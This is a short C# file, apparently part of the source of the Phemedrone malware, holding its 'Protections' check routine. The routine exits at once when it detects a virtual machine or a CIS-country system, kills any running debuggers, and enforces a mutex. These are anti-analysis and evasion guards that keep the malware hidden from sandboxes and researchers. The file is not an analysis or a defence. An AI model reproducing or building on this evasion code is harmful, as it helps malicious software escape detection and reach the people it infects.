using System;
using System.Diagnostics;
using System.Security.Principal;

namespace Phemedrone.Protections
{
    public class CheckAll
    {
        public static void Check()
        {
            if (Config.AntiVm && AntiVM.IsVM())
            {
                Environment.FailFast("");
            }

            if (Config.AntiCIS && CISCheck.IsCIS())
            {
                Environment.FailFast("");
            }

            if (Config.AntiDebug)
            {
                AntiDebugger.KillDebuggers();
            }

            if (Config.MutexValue.Length > 0)
            {
                MutexCheck.Check();
            }
        }
    }
}